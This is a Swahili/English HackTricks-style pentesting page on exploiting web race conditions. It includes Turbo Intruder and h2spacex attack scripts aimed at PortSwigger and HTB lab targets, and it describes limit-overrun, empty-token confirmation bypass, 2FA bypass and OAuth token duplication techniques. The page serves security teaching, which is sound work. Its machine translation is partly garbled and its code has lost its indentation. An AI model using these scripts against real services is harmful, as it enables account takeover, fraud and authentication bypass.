# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Ili kupata uelewa wa kina wa teknik hii angalia ripoti ya awali katika [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Kizuizi kikuu katika kutumia race conditions ni kuhakikisha kuwa requests nyingi zinashughulikiwa kwa wakati mmoja, kwa **tofauti ndogo sana katika nyakati zao za usindikajiâ€”kwa uzuri, chini ya 1ms**.

Hapa unaweza kupata mbinu baadhi za kusawazisha maombi:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Inaunga mkono kutuma requests mbili juu ya connection moja ya TCP, kupunguza athari ya network jitter. Hata hivyo, kutokana na tofauti upande wa server, requests mbili zinaweza zisitoshe kwa exploit ya race condition ya mara kwa mara.
- **HTTP/1.1 'Last-Byte Sync'**: Inaruhusu kutuma sehemu nyingi za 20-30 requests mapema, ukizuia kipande kidogo, ambacho kisha kinatumwa pamoja, kufanikisha kufika kwa wakati mmoja kwenye server.

Maandalizi ya Last-Byte Sync ni pamoja na:

1. Kutuma headers na body data bila bajeti ya mwisho bila kumaliza stream.
2. Kusitisha kwa 100ms baada ya send ya kwanza.
3. Kuzima TCP_NODELAY ili kutumia Nagle's algorithm kwa kuunganisha frames za mwisho.
4. Kufanya ping ili kuchemsha connection.

Kutuma baadaye kwa frames zilizozuiliwa kunapaswa kusababisha kuzifikia kwa packet moja, kuthibitishwa kwa Wireshark. Mbinu hii haifanyi kazi kwa static files, ambazo kwa kawaida hazihusiki na RC attacks.

### Adapting to Server Architecture

Kuelewa muundo wa lengo ni muhimu. Front-end servers zinaweza kupitisha requests tofauti, kuathiri timing. Kuchemsha connections upande wa server kwa requests zisizo na maana kunaweza kukanusha tofauti za timing.

#### Handling Session-Based Locking

Frameworks kama PHP's session handler hufanya serialize requests kwa session, jambo ambalo linaweza kuficha udhaifu. Kutumia session tokens tofauti kwa kila request kunaweza kuepuka tatizo hili.

#### Overcoming Rate or Resource Limits

Ikiwa kuchemsha connection hakufanyi kazi, kusababisha kwa makusudi ucheleweshaji wa rate au resource limits kwa web servers kupitia flood ya dummy requests kunaweza kuwezesha single-packet attack kwa kuingiza ucheleweshaji upande wa server unaofaa kwa race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Unaweza kutuma request kwa **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), unaweza kubadilisha kwenye request thamani unayotaka brute force kwa **`%s`** kama katika `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` na kisha chagua **`examples/race-single-packer-attack.py`** kutoka kwenye drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Ikiwa tovuti haitegemei HTTP2 (inatumia tu HTTP1.1), tumia `Engine.THREADED` au `Engine.BURP` badala ya `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Ikiwa unahitaji kutuma ombi kwa 1 endpoint kisha nyingi kwa endpoints nyingine ili kusababisha RCE, unaweza kubadilisha script ya `race-single-packet-attack.py` kwa kitu kama:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Inapatikana pia katika **Repeater** kupitia chaguo jipya '**Send group in parallel**' katika Burp Suite.
- Kwa **limit-overrun** unaweza tu kuongeza **same request 50 times** katika group.
- Kwa **connection warming**, unaweza **add** katika **beginning** ya **group** baadhi ya **requests** kwa sehemu isiyo-static ya web server.
- Kwa **delaying** mchakato **between** ku-processing **one request and another** katika hatua za 2 substates, unaweza **add extra requests between** requests zote mbili.
- Kwa RC ya **multi-endpoint** unaweza kuanza kutuma **request** inayowaelekea **goes to the hidden state** na kisha **50 requests** mara tu baada yake ambazo **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Lengo la script hii ni kubadilisha email ya user wakati ukithibitisha mara kwa mara mpaka verification token ya email mpya ifike kwenye last email (hii ni kwa sababu katika code ilionekana RC ambapo ilikuwa inawezekana kubadilisha email lakini verification ikatumwa kwa ile ya zamani kwa sababu variable inayobainisha email ilikuwa tayari imejazwa na ile ya kwanza).\
When the word "objetivo" is found in the received emails we know we received the verification token of the changed email and we end the attack.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Kuboresha Single Packet Attack

Katika utafiti wa asili ilielezwa kwamba shambulio hili lina kikomo cha 1,500 bytes. Hata hivyo, katika [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), ilielezwa jinsi inavyowezekana kupanua kikomo cha 1,500-byte cha single packet attack hadi **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) na kuvituma kwa mpangilio tofauti, kuruhusu kuzuia kuunganisha upya packet hadi fragments zote zifikie server. Mbinu hii iliruhusu mtafiti kutuma 10,000 requests kwa takriban 166ms.

Kumbuka kwamba ingawa uboreshaji huu unafanya shambulio kuwa wa kuaminika zaidi katika RC unaohitaji mamia/maelfu ya packets kufika kwa wakati mmoja, inaweza pia kuwa na mipaka ya programu. Baadhi ya HTTP servers maarufu kama Apache, Nginx na Go zina setting kali ya `SETTINGS_MAX_CONCURRENT_STREAMS` kwa 100, 128 na 250. Hata hivyo, zingine kama NodeJS na nghttp2 zina bila kikomo.\
Hii kwa msingi ina maana kwamba Apache itaangalia tu 100 HTTP connections kutoka kwa single TCP connection (kukandamiza RC attack hii).

Unaweza kupata baadhi ya mifano ikitumia mbinu hii katika repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Kabla ya utafiti uliotajwa hapo juu hizi zilikuwa baadhi ya payloads zilizotumika ambazo zilijaribu tu kutuma packets haraka iwezekanavyo ili kusababisha RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Send the **request** to **Intruder**, set the **number of threads** to **30** inside the **Options menu and,** select as payload **Null payloads** and generate **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Hii ni aina ya msingi kabisa ya race condition ambapo **vulnerabilities** ambazo **huonekana** katika maeneo yanayoweka **kikomo kwa idadi ya mara unazoweza kufanya kitendo**. Mfano rahisi ni kutumia msimbo wa punguzo ule ule kwenye duka la mtandaoni mara nyingi. Mfano rahisi unaweza kupatikana katika [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) au katika [**this bug**](https://hackerone.com/reports/759247)**.**

Kuna aina nyingi za shambulio hili, zikiwemo:

- Kutumia kadi ya zawadi mara nyingi
- Kutoa tathmini kwa bidhaa mara nyingi
- Kutoa au kuhamisha pesa zaidi ya salio la akaunti yako
- Kutumia tena suluhisho moja la CAPTCHA
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

Kufaida na race condition tata mara nyingi kunahitaji kuchukua fursa za muda mfupi za kuingiliana na hidden au **unintended machine substates**. Hivi ndivyo ya kuishughulikia:

1. **Identify Potential Hidden Substates**
- Anza kwa kubaini endpoints zinazobadilisha au kuingiliana na data muhimu, kama user profiles au password reset processes. Lenga kwenye:
- **Storage**: TAFUTA endpoints zinazobadilisha data inayohifadhiwa upande wa server badala ya zile zinazosimamia data upande wa client.
- **Action**: Tazama shughuli zinazobadilisha data iliyopo, ambazo zina uwezekano mkubwa wa kuunda hali zinazoweza kutumiwa ikilinganishwa na zile zinazoongeza data mpya.
- **Keying**: Shambulio zenye mafanikio kwa kawaida zinahusisha operesheni zilizo key kwenye kiashiria kilekile, kwa mfano username au reset token.
2. **Conduct Initial Probing**
- Jaribu endpoints ulizotambua kwa race condition attacks, ukizingatia mabadiliko yasiyotarajiwa kutoka kwa matokeo yaliyotarajiwa. Majibu yasiyotarajiwa au mabadiliko katika tabia ya application yanaweza kuashiria vulnerability.
3. **Demonstrate the Vulnerability**
- Punguza shambulio hadi idadi ndogo ya requests zinazohitajika ili kutekeleza vulnerability, mara nyingi ni mbili tu. Hatua hii inaweza kuhitaji majaribio mengi au automation kutokana na timing sahihi inayohitajika.

### Time Sensitive Attacks

Usahihi wa timing ya requests unaweza kufichua vulnerabilities, hasa wakati mbinu zinazoonekana zinatumia timestamps kwa ajili ya security tokens. Kwa mfano, kuzalisha password reset tokens kulingana na timestamps kunaweza kuruhusu tokens sawa kwa requests zinazofanyika kwa wakati mmoja.

**To Exploit:**

- Tumia timing sahihi, kama single packet attack, kutuma concurrent password reset requests. Tokens zinapoonekana kuwa sawa zinaonyesha vulnerability.

**Example:**

- Omba password reset tokens mbili kwa wakati mmoja na uzilinganishe. Tokens zinazolingana zinapendekeza kasoro katika uzalishaji wa tokens.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Angalia [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) kuona jinsi ya **pay** katika duka na **add an extra** item ambayo **hautahitaji kulipia**.

### Confirm other emails

Wazo ni **kuthibitisha anwani ya barua pepe na kuibadilisha kwa nyingine kwa wakati mmoja** ili kugundua kama jukwaa linathibitisha ile mpya iliyobadilishwa.

### Change email to 2 emails addresses Cookie based

Kulingana na [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab ilikuwa vulnerable kwa takeover kwa njia hii kwa sababu inaweza **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Ikiwa **2 different writes** zinatumiwa **kuongeza** **information** ndani ya **database**, kuna muda mdogo ambapo **data ya kwanza pekee imeandikwa** ndani ya database. Kwa mfano, wakati wa kuunda user, **username** na **password** zinaweza **kuandikwa** na kisha **token** ya kuthibitisha akaunti mpya kuandikwa. Hii inamaanisha kwa muda mfupi **token to confirm an account is null**.

Kwa hivyo **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) ili kuthibitisha akaunti mara moja inaweza kuruhusu c**onfirm an account** ambapo wewe huna udhibiti wa email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 uthabiti wa kudumu

Kuna several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Huduma hizi zinakuwezesha kuunda application na authenticate watumiaji ambao provider amejiandikisha. Ili kufanya hivyo, **client** itahitaji **permit your application** kupata baadhi ya data zao ndani ya **OAUth provider**.\
Hivyo, hadi hapa ni login ya kawaida na google/linkedin/github... ambapo utaonyeshwa ukurasa unaosema: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Tatizo linaonekana unapokubali na mara moja kutumwa `authorization_code` kwa application hasidi. Kisha, application hii inatumia Race Condition katika OAUth service provider ili kuzalisha zaidi ya AT/RT moja (_Authentication Token/Refresh Token_) kutoka kwa `authorization_code` kwa akaunti yako. Kwa msingi, itafanya matumizi ya kwamba umemruhusu application kufikia data yako ili **kuunda akaunti nyingi**. Kisha, ukisitekuruhusu application kutekeleza upatikanaji wa data yako jozi moja ya AT/RT itaondolewa, lakini zingine zitaendelea kuwa halali.

#### Race Condition in `Refresh Token`

Mara tu unapopata RT halali unaweza kujaribu kuitumia vibaya (abuse) kuzalisha AT/RT kadhaa; na hata mtumiaji atakapofuta ruhusa za application hasidi kufikia data yake, RT kadhaa zitaendelea kuwa halali.

## **RC in WebSockets**

- Katika [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) utaona PoC kwa Java ya kutuma ujumbe za websocket kwa **parallel** ili kutumia Race Conditions pia kwenye Web Sockets.
- Kwa Burpâ€™s WebSocket Turbo Intruder unaweza kutumia engine ya **THREADED** kuanzisha muunganisho nyingi za WS na kutuma payloads kwa parallel. Anza na mfano rasmi na tunza `config()` (thread count) kwa concurrency; mara nyingi hii ni ya kuaminika zaidi kuliko batching kwenye muunganisho mmoja wakati wa kupigana (racing) hali ya serverâ€‘side kupitia WS handlers. Tazama [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Marejeo

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder â€“ GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
